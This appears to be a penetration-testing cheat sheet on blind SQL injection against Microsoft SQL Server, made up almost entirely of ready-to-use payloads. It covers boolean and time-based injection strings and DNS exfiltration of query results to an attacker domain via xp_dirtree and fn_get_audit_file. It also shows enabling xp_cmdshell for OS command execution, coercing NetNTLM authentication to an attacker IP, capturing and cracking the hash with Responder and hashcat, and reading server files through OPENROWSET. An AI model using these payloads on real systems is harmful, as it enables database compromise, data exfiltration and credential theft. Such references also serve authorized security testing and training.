#web #sqli #blind #mssql #oob

# Blind SQL Injection

Boolean/time/OOB inference, plus MSSQL RCE & file read. Related: [sqli](sqli.md) · [sqli-advanced](sqli-advanced.md) · [sqlmap](sqlmap.md) · [mssql-sccm](../AD/mssql-sccm.md)

## Boolean / Time-Based
```sql
' AND 1=1;-- 
```
Boolean-based inference.

```sql
'; IF (1=1) WAITFOR DELAY '0:0:10';-- 
```
Time-based inference (MSSQL).

## Out-of-Band DNS (MSSQL)
```sql
DECLARE @T varchar(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_dirtree "\\'+@T+'.YOUR.DOMAIN\x"');
```
Exfiltrate data via DNS using xp_dirtree.

```sql
DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM fn_get_audit_file('\\'+@T+'.YOUR.DOMAIN\',DEFAULT,DEFAULT);
```
OOB exfil via fn_get_audit_file.

## MSSQL RCE (xp_cmdshell)
```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
```
Check for sysadmin.

```sql
EXEC sp_configure 'Show Advanced Options', '1'; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', '1'; RECONFIGURE;
```
Enable xp_cmdshell.

```sql
EXEC xp_cmdshell 'ping /n 4 192.168.43.164';
```
Execute an OS command.

## MSSQL NetNTLM Capture
```bash
sudo python3 Responder.py -I eth0
```
Start Responder to capture the hash. See [ntlm-relay](../AD/ntlm-relay.md).

```sql
EXEC master..xp_dirtree '\\<ATTACKER_IP>\myshare', 1, 1;
```
Coerce the SQL service account to authenticate.

```bash
hashcat -m 5600 'jason::SQL01:bd7f162c24a39a0f:94DF80C5ABB...' /usr/share/wordlists/rockyou.txt
```
Crack the captured NetNTLMv2 hash. See [hashcat](../Passwords/hashcat.md).

## MSSQL File Read
```sql
SELECT COUNT(*) FROM fn_my_permissions(NULL, 'DATABASE') WHERE permission_name = 'ADMINISTER BULK OPERATIONS' OR permission_name = 'ADMINISTER DATABASE BULK OPERATIONS';
```
Check for bulk-operation permissions.

```sql
SELECT BulkColumn FROM OPENROWSET(BULK '<path>', SINGLE_CLOB) AS x
```
Read a file via OPENROWSET.
